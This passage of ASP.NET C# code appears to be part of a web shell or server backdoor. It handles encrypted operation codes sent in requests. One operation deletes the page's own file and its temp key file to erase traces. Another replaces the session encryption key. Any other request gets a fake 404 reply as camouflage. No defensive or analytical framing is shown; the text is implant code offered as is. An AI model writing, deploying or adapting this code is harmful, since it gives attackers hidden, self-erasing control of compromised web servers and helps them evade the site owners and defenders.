    Response.ContentType = "text/plain";
    Response.Write(JWSeal(key, JWReply(Encoding.UTF8.GetBytes(fsOut))));
    return;
  }
  if (op == "D") {
    bool ok = false;
    try {
      string path = Request.PhysicalPath;
      if (!string.IsNullOrEmpty(path)) { File.Delete(path); ok = !File.Exists(path); }
      try { File.Delete(Path.Combine(Path.GetTempPath(), JWF)); } catch { }
    } catch { }
    Response.ContentType = "text/plain";
    Response.Write(JWSeal(key, JWReply(Encoding.UTF8.GetBytes(ok ? "__JWDEL_OK__" : "__JWDEL_FAIL__"))));
    return;
  }
  if (op == "R") {
    byte[] nk = JWArg(p);
    if (nk == null || nk.Length != 32) { JW404(); return; }
    try { File.WriteAllText(Path.Combine(Path.GetTempPath(), JWF), Convert.ToBase64String(nk)); } catch { }
    JWKEY = nk;
    Response.ContentType = "text/plain";
    Response.Write(JWSeal(nk, JWReply(new byte[0])));
    return;
  }
  JW404();
}
</script>`
